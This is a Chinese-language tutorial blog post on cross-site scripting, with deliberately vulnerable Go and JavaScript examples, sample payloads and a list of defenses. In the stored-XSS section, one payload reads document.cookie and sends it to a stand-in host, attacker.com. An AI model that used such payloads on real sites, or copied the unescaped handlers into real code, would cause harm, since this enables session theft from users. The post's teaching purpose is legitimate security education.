---
title: XSS Attack
createTime: 2025-1-27
author: ZQ
permalink: /network/webserver/xss/attack/
tags:
  - web
---

跨站脚本攻击（Cross-Site Scripting，XSS）是一种常见的Web安全漏洞。攻击者通过在网页中注入恶意的客户端脚本，使其在用户的浏览器上执行，从而获取用户的敏感信息，如Cookie、会话令牌等，或者执行其他恶意操作。

<!-- more -->

## 原理

+ 输入验证不足：Web应用程序未对用户输入进行充分的验证和过滤，直接将用户输入渲染到页面中。
+ HTML注入：攻击者能够将HTML标签和JavaScript代码注入到网页中。
+ 脚本执行：注入的恶意代码在用户浏览器中被解析并执行。

## 实验

### 反射型XSS演示

使用`gin`框架实现一个简单的搜索功能，展示反射型XSS漏洞。完整示例代码可在[github](https://github.com/Zqzqsb/WebSecurityDemos/tree/main/XSS_Inject)查看。

```go
// Reflected XSS endpoint - vulnerable to XSS attacks
func searchHandler(c *gin.Context) {
    query := c.Query("q")
    // Unsafe: directly reflecting user input
    result := "Search results for: " + query
    c.Header("Content-Type", "text/html")
    c.String(http.StatusOK, result)
}
```

### 反射型XSS

反射型XSS是最简单的XSS攻击形式，攻击者将恶意代码作为URL参数传入，服务器将其直接反射到响应页面中。

当攻击者构造以下URL：
```
http://example.com/search?q=<script>alert('XSS!');</script>
```

服务器响应的HTML内容为：
```html
Search results for: <script>alert('XSS!');</script>
```

浏览器解析这段HTML时会执行JavaScript代码，弹出警告框。

### 存储型XSS

存储型XSS通过将恶意代码存储在服务器数据库中，当其他用户访问包含该内容的页面时触发攻击。

```go
// Stored XSS vulnerability in comment system
func commentHandler(c *gin.Context) {
    content := c.PostForm("content")
    // Unsafe: storing unfiltered user input
    db.Create(&Comment{Content: content})
    c.Redirect(http.StatusFound, "/")
}
```

攻击者提交包含恶意代码的评论：
```html
<script>
    var cookie = document.cookie;
    new Image().src = "http://attacker.com/steal?cookie=" + cookie;
</script>
```

当其他用户访问评论页面时，恶意脚本会执行并将用户的Cookie发送给攻击者。

### DOM型XSS

DOM型XSS利用JavaScript动态修改页面DOM结构时的漏洞，不需要与服务器交互。

```javascript
// Unsafe DOM manipulation
function showGreeting() {
    var name = document.getElementById('userInput').value;
    document.getElementById('output').innerHTML = 'Hello, ' + name + '!';
}
```

攻击者输入：
```html
<img src=x onerror="alert('DOM XSS!');">
```

当JavaScript将这段内容插入DOM时，`onerror`事件处理器会被触发，执行攻击代码。

### URL片段攻击

DOM型XSS的另一种形式是通过URL片段（fragment）进行攻击：

```javascript
// Unsafe handling of URL fragment
if(window.location.hash) {
    var hash = window.location.hash.slice(1);
    document.getElementById('output').innerHTML = decodeURIComponent(hash);
}
```

攻击者构造URL：
```
http://example.com/#<script>alert('URL Fragment XSS!');</script>
```

## 防护措施

1. 输入验证和过滤
```go
// Safe: escaping HTML content
safeContent := template.HTMLEscapeString(content)
```

2. 使用安全的模板系统
```go
// Safe: using template engine's auto-escaping
tmpl.Execute(w, data)
```

3. 内容安全策略（CSP）
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

4. 输出编码
```javascript
// Safe: using textContent instead of innerHTML
element.textContent = userInput;
```

5. HttpOnly Cookie
```go
c.SetCookie("session", token, 3600, "/", "", true, true)
```

6. 验证URL和文件上传
```go
// Validate URLs
if !isValidURL(url) {
    return errors.New("invalid URL")
}
```

## 总结

XSS攻击利用了Web应用程序对用户输入处理不当的漏洞。通过实施适当的安全措施，如输入验证、输出编码和内容安全策略，可以有效防止XSS 攻击。在开发Web应用时，应始终遵循安全编码实践，确保用户数据的安全处理。